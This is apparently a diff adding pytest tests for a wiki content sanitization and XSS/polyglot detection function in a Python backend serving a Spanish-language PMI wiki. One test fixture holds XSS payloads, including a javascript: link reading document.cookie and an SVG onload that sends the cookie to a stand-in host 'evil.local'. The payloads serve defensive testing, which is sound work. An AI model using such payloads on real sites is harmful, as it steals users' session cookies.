@@ -13298,3 +13298,126 @@ def test_audit_wiki_semantic_drift_and_vector_embedding_stale_invalidation_empty
         "audit_wiki_semantic_drift_and_vector_embedding_stale_invalidation"
         in mod.__all__
     )
+
+
+def test_audit_wiki_content_sanitization_healthy_clean():
+    from backend.services.wiki_pmi_service import (
+        audit_wiki_content_sanitization_and_polyglot_injection_guard,
+    )
+
+    docs = [
+        {
+            "document_id": "wiki-pmi-01",
+            "title": "PMBOK §4.4 Plan de Gestión del Conocimiento",
+            "content": "# Compendio Canónico PMI\n\nEste compendio define las directrices y lecciones aprendidas.\n\n- Punto 1: Gobernanza\n- Punto 2: Integridad de datos",
+            "csp_header": "default-src 'self'; script-src 'self'; object-src 'none'",
+        }
+    ]
+    res = audit_wiki_content_sanitization_and_polyglot_injection_guard(
+        docs,
+        enforce_strict_csp=True,
+    )
+    assert res["status"] == "CLEAN_WIKI_CONTENT_SECURITY_OPTIMAL"
+    assert res["is_wiki_content_secure"] is True
+    assert res["total_documents"] == 1
+    assert res["clean_documents_count"] == 1
+    assert res["warning_documents_count"] == 0
+    assert res["critical_documents_count"] == 0
+    assert res["xss_vectors_detected"] == 0
+    assert res["polyglot_vectors_detected"] == 0
+    assert res["dangerous_protocols_detected"] == 0
+    assert res["permissive_elements_detected"] == 0
+    assert res["csp_violations_count"] == 0
+    assert res["documents"][0]["is_secure"] is True
+
+
+def test_audit_wiki_content_sanitization_warning_permissive():
+    from backend.services.wiki_pmi_service import (
+        audit_wiki_content_sanitization_and_polyglot_injection_guard,
+    )
+
+    docs = [
+        {
+            "document_id": "wiki-pmi-02",
+            "title": "Embed y CSP Permisivo",
+            "content": "A continuación un diagrama interactivo: <iframe src='https://diagrams.ccf.local/view'></iframe> y una imagen <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=' />",
+            "csp_header": "default-src 'self'; script-src 'self' 'unsafe-inline'",
+        }
+    ]
+    res = audit_wiki_content_sanitization_and_polyglot_injection_guard(
+        docs,
+        enforce_strict_csp=True,
+        allow_data_images=False,
+    )
+    assert res["status"] == "WARNING_PERMISSIVE_MARKDOWN_ELEMENTS"
+    assert res["is_wiki_content_secure"] is False
+    assert res["total_documents"] == 1
+    assert res["warning_documents_count"] == 1
+    assert res["critical_documents_count"] == 0
+    assert res["permissive_elements_detected"] >= 2
+    assert res["csp_violations_count"] == 1
+    assert res["documents"][0]["is_secure"] is False
+
+
+def test_audit_wiki_content_sanitization_critical_xss_and_polyglot():
+    from backend.services.wiki_pmi_service import (
+        audit_wiki_content_sanitization_and_polyglot_injection_guard,
+    )
+
+    docs = [
+        {
+            "document_id": "wiki-pmi-03",
+            "title": "Ataques XSS y Polyglots",
+            "content": """
+            Texto legítimo
+            <script>alert('pwned')</script>
+            <a href="javascript:alert(document.cookie)">Click me</a>
+            <svg onload="fetch('https://evil.local?c='+document.cookie)"></svg>
+            <iframe sandbox="allow-scripts allow-same-origin" src="https://evil.local"></iframe>
+            """,
+            "csp_header": "default-src 'self'; script-src 'self' 'unsafe-eval'",
+        }
+    ]
+    res = audit_wiki_content_sanitization_and_polyglot_injection_guard(
+        docs,
+        enforce_strict_csp=True,
+    )
+    assert res["status"] == "CRITICAL_MALICIOUS_POLYGLOT_XSS_DETECTED"
+    assert res["is_wiki_content_secure"] is False
+    assert res["total_documents"] == 1
+    assert res["critical_documents_count"] == 1
+    assert res["xss_vectors_detected"] >= 2
+    assert res["polyglot_vectors_detected"] >= 1
+    assert res["dangerous_protocols_detected"] >= 1
+    assert len(res["documents"][0]["critical_findings"]) >= 4
+
+
+def test_audit_wiki_content_sanitization_empty_and_binding():
+    import backend.services.wiki_pmi_service as mod
+    from backend.services.wiki_pmi_service import (
+        WikiPMIService,
+        audit_wiki_content_sanitization_and_polyglot_injection_guard,
+    )
+
+    empty = audit_wiki_content_sanitization_and_polyglot_injection_guard(None)
+    assert empty["status"] == "CLEAN_WIKI_CONTENT_SECURITY_OPTIMAL"
+    assert empty["total_documents"] == 0
+    assert empty["is_wiki_content_secure"] is True
+    assert (
+        WikiPMIService.audit_wiki_content_sanitization_and_polyglot_injection_guard(
+            None
+        )
+        == empty
+    )
+    assert (
+        "audit_wiki_content_sanitization_and_polyglot_injection_guard"
+        in mod.__all__
+    )
+
+    invalid_docs = audit_wiki_content_sanitization_and_polyglot_injection_guard(
+        ["string_item", 123, None],
+        max_untrusted_elements_threshold=-5,
+    )
+    assert invalid_docs["total_documents"] == 0
+    assert invalid_docs["status"] == "CLEAN_WIKI_CONTENT_SECURITY_OPTIMAL"
+
